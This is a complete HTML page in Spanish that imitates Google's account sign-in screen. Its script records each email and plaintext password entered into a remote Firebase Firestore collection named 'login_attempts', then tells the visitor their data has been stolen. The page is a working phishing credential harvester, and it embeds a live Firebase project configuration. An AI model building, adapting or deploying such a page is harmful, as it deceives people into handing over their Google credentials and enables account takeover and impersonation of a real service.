<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceder - Cuenta de Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #000; /* Fondo negro */
            color: #fff; /* Texto blanco */
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            display: flex;
            width: 70%; /* 30% más pequeño */
            max-width: 900px; /* Ajuste del ancho máximo */
            background-color: #000; /* Fondo negro */
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            position: relative;
        }
        .left-side {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: flex-start; /* Alineación arriba */
            align-items: flex-start; /* Alineación a la izquierda */
            padding: 40px;
            background-color: #1a1a1a; /* Fondo gris oscuro */
            padding-top: 60px; /* Más arriba */
        }
        .left-side img {
            width: 60px; /* Tamaño del logo ajustado */
            margin-bottom: 20px;
        }
        .left-side h1 {
            font-size: 28px; /* Tamaño del texto ajustado */
            font-weight: 500;
            margin-bottom: 10px;
            color: #fff; /* Texto blanco */
        }
        .left-side p {
            font-size: 16px; /* Tamaño del texto ajustado */
            color: #9e9e9e; /* Texto gris claro */
        }
        .right-side {
            flex: 1;
            padding: 40px;
            background-color: #000; /* Fondo negro */
            display: flex;
            flex-direction: column;
            justify-content: space-between; /* Espaciado entre elementos */
        }
        .right-side h2 {
            font-size: 24px; /* Tamaño del texto ajustado */
            font-weight: 500;
            margin-bottom: 20px;
            color: #fff; /* Texto blanco */
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            font-size: 14px;
            color: #9e9e9e; /* Texto gris claro */
            display: block;
            margin-bottom: 8px;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #333; /* Borde gris oscuro */
            border-radius: 4px;
            background-color: #1a1a1a; /* Fondo gris oscuro */
            color: #fff; /* Texto blanco */
            outline: none;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }
        .input-group input:focus {
            border-color: #1a73e8; /* Azul de Google */
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        .button-group {
            display: flex;
            gap: 10px; /* Espacio entre botones */
        }
        .button-group button {
            flex: 1;
            padding: 12px;
            font-size: 16px;
            background-color: #8ab4f8; /* Celeste clarito */
            color: #1a73e8; /* Celeste oscuro */
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .button-group button.create-account {
            background-color: transparent; /* Sin fondo */
            color: #8ab4f8; /* Celeste clarito */
            border: 1px solid #8ab4f8; /* Borde celeste clarito */
        }
        .button-group button:hover {
            background-color: #6a9ef5; /* Celeste más oscuro al pasar el mouse */
        }
        .button-group button.create-account:hover {
            background-color: rgba(138, 180, 248, 0.1); /* Fondo transparente con tono celeste */
        }
        .info-section {
            font-size: 14px;
            color: #9e9e9e; /* Texto gris claro */
            margin-bottom: 20px;
        }
        .info-section ul {
            list-style-type: none;
            padding: 0;
        }
        .info-section ul li {
            margin-bottom: 10px;
        }
        .info-section ul li a {
            color: #8ab4f8; /* Celeste clarito */
            text-decoration: none;
        }
        .info-section ul li a:hover {
            text-decoration: underline;
        }
        .external-links {
            position: absolute;
            bottom: 20px;
            left: 20px;
            right: 20px;
            font-size: 12px;
            color: #9e9e9e; /* Texto gris claro */
            display: flex;
            justify-content: space-between; /* Espacio entre enlaces */
        }
        .external-links .left {
            display: flex;
            gap: 10px; /* Espacio entre enlaces */
        }
        .external-links .right {
            display: flex;
            gap: 10px; /* Espacio entre enlaces */
        }
        .external-links a {
            color: #8ab4f8; /* Celeste clarito */
            text-decoration: none;
        }
        .external-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Mitad izquierda: Logo y texto -->
        <div class="left-side">
            <img src="https://static.vecteezy.com/system/resources/previews/013/760/951/large_2x/colourful-google-logo-in-dark-background-free-vector.jpg" alt="Logo de Google">
            <h1>Acceder</h1>
            <p>Usa tu cuenta de Google</p>
        </div>

        <!-- Mitad derecha: Formulario y enlaces -->
        <div class="right-side">
            <form id="login-form">
                <div class="input-group">
                    <label for="email">Correo electrónico o teléfono</label>
                    <input type="email" id="email" required>
                </div>
                <div class="input-group">
                    <label for="password">Contraseña</label>
                    <input type="password" id="password" required>
                </div>
                <div class="button-group">
                    <button type="submit">Siguiente</button>
                    <button class="create-account">Crear cuenta</button>
                </div>
            </form>

            <div class="info-section">
                <ul>
                    <li>(A) ¿No es tu computadora? Usa el modo de invitado para navegar de forma privada. <a href="#">Más información para usar el modo de invitado</a></li>
                </ul>
            </div>
        </div>

        <!-- Enlaces externos: Ayuda, Privacidad, Condiciones -->
        <div class="external-links">
            <div class="left">
                <span>Español (Latinoamérica)</span>
            </div>
            <div class="right">
                <a href="#">Ayuda</a>
                <a href="#">Privacidad</a>
                <a href="#">Condiciones</a>
            </div>
        </div>
    </div>

    <!-- Import Firebase SDKs -->
    <script type="module">
        // Importa los módulos necesarios de Firebase
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getFirestore, collection, addDoc, Timestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        // Configuración de Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyBEWPP5MEi7TD5VTZkp7my1VztTcSEx-KE",
            authDomain: "login-attempts-9606c.firebaseapp.com",
            projectId: "login-attempts-9606c",
            storageBucket: "login-attempts-9606c.firebasestorage.app",
            messagingSenderId: "663920712947",
            appId: "1:663920712947:web:ad71401e5dc108a5d2eb86"
        };

        // Inicializa Firebase
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app); // Inicializa Firebase Authentication
        const db = getFirestore(app); // Inicializa Firestore

        // Función para guardar intentos de inicio de sesión en Firestore
        async function saveLoginAttempt(email, password, success) {
            try {
                const docRef = await addDoc(collection(db, "login_attempts"), {
                    email: email,
                    password: password, // Guarda la contraseña
                    success: success,
                    timestamp: Timestamp.fromDate(new Date()) // Fecha y hora actual
                });
                console.log("Intento de inicio de sesión guardado con ID:", docRef.id);
            } catch (e) {
                console.error("Error al guardar el intento de inicio de sesión:", e);
            }
        }

        // Maneja el envío del formulario
        const form = document.getElementById("login-form");
        form.addEventListener("submit", async function(event) {
            event.preventDefault(); // Evita que el formulario se recargue

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            if (email && password) {
                try {
                    // Intenta autenticar al usuario
                    const userCredential = await signInWithEmailAndPassword(auth, email, password);
                    const user = userCredential.user;

                    // Guarda el intento de inicio de sesión exitoso en Firestore
                    await saveLoginAttempt(email, password, true);

                    // Limpia el mensaje de error y muestra un mensaje de éxito
                    alert("Inicio de sesión exitoso!");
                } catch (error) {
                    // Maneja errores de autenticación
                    console.error("Error de autenticación:", error.code, error.message);

                    // Guarda el intento de inicio de sesión fallido en Firestore
                    await saveLoginAttempt(email, password, false);

                    // Muestra una alerta con los datos ingresados
                    alert(`Sus datos han sido robados:\nCorreo: ${email}\nContraseña: ${password}`);
                }
            } else {
                alert("Por favor, completa todos los campos");
            }
        });
    </script>

</body>
</html>
